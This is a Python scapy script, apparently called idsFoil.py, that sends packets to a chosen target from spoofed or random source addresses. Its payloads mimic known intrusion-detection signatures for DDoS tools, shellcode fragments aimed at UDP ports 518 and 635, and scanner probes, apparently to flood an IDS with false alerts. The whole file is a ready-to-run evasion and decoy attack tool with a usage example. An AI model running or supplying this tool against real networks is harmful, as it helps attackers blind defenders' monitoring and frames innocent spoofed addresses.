# Kali
# sudo -E python3 idsFoil.py -i eth0 -s 1.3.3.7 -t 192.168.1.2 -c 1

import argparse
from scapy.all import *
from random import randint

def main():
    parser = argparse.ArgumentParser(description='-i <iface> -s <src> -t <target> -c <count>')

    parser.add_argument('-i', dest='iface', type=str, help='specify network interface')
    parser.add_argument('-s', dest='src', type=str, help='specify source address')
    parser.add_argument('-t', dest='tgt', type=str, help='specify target address')
    parser.add_argument('-c', dest='count', type=int, help='specify packet count')

    args = parser.parse_args()

    if args.iface == None:
        iface = 'eth0'
    else:
        iface = args.iface

    if args.src == None:
        src = '.'.join([str(randint(1,254)) for x in range(4)])
    else:
        src = args.src

    if args.tgt == None:
        print(parser.usage)
        exit(0)
    else:
        dst = args.tgt

    if args.count == None:
        count = 1
    else:
        count = args.count


    ddosTest(src, dst, iface, count)
    exploitTest(src, dst, iface, count)
    scanTest(src, dst, iface, count)

    return

def ddosTest(src, dst, iface, count):
    pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src,dst=dst)/UDP(dport=31335)/Raw(load='PONG')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src,dst=dst)/ICMP(type=0,id=456)
    send(pkt, iface=iface, count=count)

    return

def exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)

    return

def scanTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) / Raw(load='cybercop')
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=10080) / Raw(load='Amanda')
    send(pkt, iface=iface, count=count)

    return


if __name__ == '__main__':
    main()
